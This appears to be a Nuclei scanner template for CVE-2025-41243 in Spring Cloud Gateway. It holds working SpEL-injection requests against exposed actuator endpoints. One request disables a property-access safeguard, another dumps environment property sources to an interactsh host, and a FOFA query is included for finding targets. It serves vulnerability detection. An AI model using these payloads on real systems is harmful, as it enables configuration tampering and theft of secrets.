flow: http(1) && http(2) && http(3) && http(4)
http:
- matchers:
  - condition: and
    dsl:
    - status_code_1 == 201 && status_code_2 == 200 && status_code_3 == 200
    - len(body_1) == 0 && len(body_2) == 0
    - contains_all(body_3, "AddResponseHeader", "route_id")
    internal: true
    type: dsl
  raw:
  - "POST /actuator/gateway/routes/{{route}} HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ application/json\n\n{\n  \"id\": \"{{route}}\",\n  \"filters\": [\n    {\n \
    \     \"name\": \"AddResponseHeader\",\n      \"args\": {\n        \"value\":\
    \ \"#{ @systemProperties['spring. cloud.gateway.restrictive-property-accessor.enabled']\
    \ = false}\",\n        \"name\": \"cmd\"\n      }\n    }\n  ],\n  \"uri\": \"\
    http://{{interactsh-url}}\",\n  \"order\": 0\n}\n"
  - 'POST /actuator/gateway/refresh HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /actuator/gateway/routes/{{route}} HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 201
    - len(body) == 0
    internal: true
    type: dsl
  raw:
  - "POST /actuator/gateway/routes/{{route}} HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ application/json\n\n{\n  \"id\": \"{{route}}\",\n  \"filters\": [\n    {\n \
    \     \"name\": \"AddResponseHeader\",\n      \"args\": {\n        \"value\":\
    \ \"#{ @environment.getPropertySources.?[#this.name matches '.*optional:classpath:.*'\
    \ ][0].source.![{#this.getKey+'='+#this.getValue.toString}] }\",\n        \"name\"\
    : \"cmd\"\n      }\n    }\n  ],\n  \"uri\": \"http://{{interactsh-url}}\",\n \
    \ \"order\": 0\n}\n"
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - len(body) == 0
    internal: true
    type: dsl
  raw:
  - 'POST /actuator/gateway/refresh HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_all(body, "spring.cloud.gateway","RouteDefinitionRouteLocator")
    type: dsl
  raw:
  - 'GET /actuator/gateway/routes/{{route}} HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2025-41243
info:
  author: Redmomn
  classification:
    cve-id: CVE-2025-41243
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-94
    epss-percentile: 0.91146
    epss-score: 0.07004
  description: 'Spring Cloud Gateway Server Webflux contains a vulnerability caused
    by unsecured and exposed actuator endpoints allowing modification of Spring Environment
    properties, letting attackers modify configuration, exploit requires unsecured
    actuator endpoints exposure.

    '
  impact: 'Attackers can modify Spring Environment properties, potentially leading
    to configuration tampering and further compromise.

    '
  metadata:
    fofa-query: '((header="Server: Netty@SpringBoot" || (body="Whitelabel Error Page"
      && body="There was an unexpected error")) && body!="couchdb") || title="SpringBootAdmin-Server"
      || body="SpringBoot"'
    verified: true
  name: Spring Cloud Gateway Server Webflux - Broken Access Control
  reference:
  - https://blog.z3r.ru/posts/spring-cloud-gateway-spel-vuln/
  - https://xz.aliyun.com/news/19006
  - https://spring.io/security/cve-2025-41243
  - https://nvd.nist.gov/vuln/detail/CVE-2025-41243
  remediation: 'Secure actuator endpoints or disable gateway actuator exposure; update
    to latest Spring Cloud Gateway Server Webflux version.

    '
  severity: critical
  tags: cve,cve2025,spring-boot,injection
variables:
  route: '{{rand_text_alpha(8)}}'
